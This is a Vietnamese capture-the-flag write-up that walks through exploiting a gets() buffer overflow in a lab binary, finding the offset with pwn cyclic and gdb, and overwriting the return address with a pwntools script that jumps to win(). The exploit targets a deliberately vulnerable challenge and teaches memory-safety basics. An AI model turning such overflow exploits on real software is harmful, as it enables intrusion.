# offset-cycle

Đầu ta SSH vào server, nhập mk đc cấp, **ls** để liệt kê các file gồm 3 file **CodeBank, start và intructions.txt**

dựa vào hint trong file **intructions.txt,** ta tìm **offset → overwrite return address → gọi win()** (hoặc hàm in flag) trong vòng 120s

bắt đầu ta chạy file **./start**

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

ta phân tích file **18.c**

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

nhìn thấy bug :

* **gets()** → buffer overflow
* không giới hạn input

`gets()` trong C không kiểm tra độ dài input, nên nếu nhập chuỗi dài hơn kích thước buffer, dữ liệu sẽ tràn sang vùng nhớ khác và có thể ghi đè return address → gây buffer overflow

**Ví dụ:**

```
char buf[4];
gets(buf);
```

Nếu nhập:

```
AAAAAAA
```

⇒ 4 ký tự đầu vào `buf`, phần dư sẽ tràn sang vùng nhớ bên cạnh (có thể ghi đè dữ liệu quan trọng như return address).

từ đây ta tìm offset bằng cyclic + gdb

#### Generate payload:

```
pwn cyclic 300
```

#### Chạy trong gdb:

```
gdb 18
run <<< $(pwn cyclic 300)
```

#### Khi crash:

```
Jumping to 0x61616362
```

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

sau đó lấy giá trị EIP (EIP là thanh ghi chỉ **địa chỉ lệnh tiếp theo chương trình sẽ chạy**. Trong bài này, khi buffer overflow xảy ra, EIP bị ghi đè bởi input . Ta lấy giá trị EIP sau khi crash để dùng `cyclic -l` tìm **offset**, rồi dùng offset đó để ghi đè EIP bằng địa chỉ `win()` → chương trình nhảy vào `win` và lấy flag.)

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

rồi tính ofset

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

ta viết một script để khai thác bằng pwntools

```
from pwn import *

binary = input("Enter the binary name: ")
offset = int(input("Enter the offset: "))

exe = f"./{binary}"
elf = context.binary = ELF(exe)

context.arch = "i386"

win_addr = elf.symbols["win"]
log.success(f"Found win() at: {hex(win_addr)}")

p = process(exe)

payload = b"A" * offset + p32(win_addr)

p.sendline(payload)
p.interactive()
```

và chạy file đó, nhập những cái vừa tìm đc là ra Flag

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
